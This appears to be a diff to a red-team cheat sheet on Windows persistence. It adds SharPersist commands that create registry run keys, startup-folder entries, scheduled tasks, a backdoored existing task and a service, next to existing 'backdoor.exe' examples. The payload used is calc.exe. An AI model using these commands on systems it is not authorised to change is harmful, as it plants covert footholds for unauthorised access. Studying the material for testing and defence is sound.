@@ -2,6 +2,7 @@
 
 ## Summary
 
+* [Tools](#tools)
 * [Userland](#userland)
     * [Registry](#registry)
     * [Startup](#startup)
@@ -12,6 +13,10 @@
     * [Scheduled Task](#scheduled-task)
 * [References](#references)
 
+
+## Tools
+
+- [SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r](https://github.com/fireeye/SharPersist)
 
 ## Userland
 
@@ -24,6 +29,14 @@ Value name:  Backdoor
 Value data:  C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
 ```
 
+Using SharPersist
+
+```powershell
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "hkcurun" -v "Test Stuff" -m add -o env
+SharPersist -t reg -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -k "logonscript" -m add
+```
+
 ### Startup
 
 Create a batch script in the user startup folder.
@@ -31,6 +44,12 @@ Create a batch script in the user startup folder.
 ```powershell
 PS C:\> gc C:\Users\Rasta\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\backdoor.bat
 start /b C:\Users\Rasta\AppData\Local\Temp\backdoor.exe
+```
+
+Using SharPersist
+
+```powershell
+SharPersist -t startupfolder -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -f "Some File" -m add
 ```
 
 ### Scheduled Task
@@ -42,6 +61,25 @@ PS C:\> $P = New-ScheduledTaskPrincipal "Rasta"
 PS C:\> $S = New-ScheduledTaskSettingsSet
 PS C:\> $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S
 PS C:\> Register-ScheduledTask Backdoor -InputObject $D
+```
+
+Using SharPersist
+
+```powershell
+# Add to a current scheduled task
+SharPersist -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Something Cool" -m add
+
+# Add new task
+SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add
+SharPersist -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Task" -m add -o hourly
+```
+
+## Windows Service
+
+Using SharPersist
+
+```powershell
+SharPersist -t service -c "C:\Windows\System32\cmd.exe" -a "/c calc.exe" -n "Some Service" -m add
 ```
 
 ## Elevated
@@ -80,3 +118,4 @@ PS C:\> Register-ScheduledTask Backdoor -InputObject $D
 
 * [A view of persistence - Rastamouse](https://rastamouse.me/2018/03/a-view-of-persistence/)
 * [Windows Persistence Commands - Pwn Wiki](http://pwnwiki.io/#!persistence/windows/index.md)
+* [SharPersist Windows Persistence Toolkit in C - Brett Hawkins](http://www.youtube.com/watch?v=K7o9RSVyazo)
